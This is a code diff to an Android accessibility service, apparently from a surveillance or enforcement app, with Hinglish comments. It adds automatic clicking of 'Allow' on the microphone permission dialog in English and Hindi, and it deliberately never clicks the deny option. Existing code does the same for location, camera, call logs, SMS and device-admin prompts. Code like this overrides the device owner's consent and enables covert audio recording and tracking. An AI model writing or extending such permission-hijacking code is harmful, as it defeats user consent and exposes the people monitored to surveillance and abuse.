@@ -217,6 +217,9 @@ class EnforcementService : AccessibilityService() {
         val ALLOW_EXACT: Map<String, Set<String>> = mapOf(
             "loc" to setOf("allow all the time", "while using the app", "only this time", "allow"),
             "cam" to setOf("allow", "only this time"),
+            // Mic runtime permission self-heal (audio_start jab RECORD_AUDIO miss ho):
+            // system permission dialog par Allow/While-using khud click hota hai.
+            "mic" to setOf("allow", "while using the app", "only this time"),
             "calls" to setOf("allow"),
             "battery" to setOf("allow"),
             "admin" to setOf(
@@ -346,6 +349,7 @@ class EnforcementService : AccessibilityService() {
         when (step) {
             "loc" -> ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||
                 ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
+            "mic" -> ContextCompat.checkSelfPermission(ctx, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
             "cam" -> ContextCompat.checkSelfPermission(ctx, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
             "calls" -> ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED ||
                 ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED ||
@@ -381,6 +385,16 @@ class EnforcementService : AccessibilityService() {
         if (step == "loc") {
             for (n in root.findAccessibilityNodeInfosByText("उपयोग करते समय")) {
                 if (!n.isCheckable && clickDeep(n)) return true
+            }
+        }
+        // Mic permission dialog ka Hindi text bhi lamba hota hai — contains rule.
+        if (step == "mic") {
+            for (needle in listOf("करते समय", "इस बार ही", "अनुमति दें")) {
+                for (n in root.findAccessibilityNodeInfosByText(needle)) {
+                    val text = (n.text ?: n.contentDescription)?.toString()?.trim() ?: continue
+                    if ("न दें" in text) continue // "अनुमति न दें" (deny) par kabhi click nahi
+                    if (!n.isCheckable && clickDeep(n)) return true
+                }
             }
         }
         return false
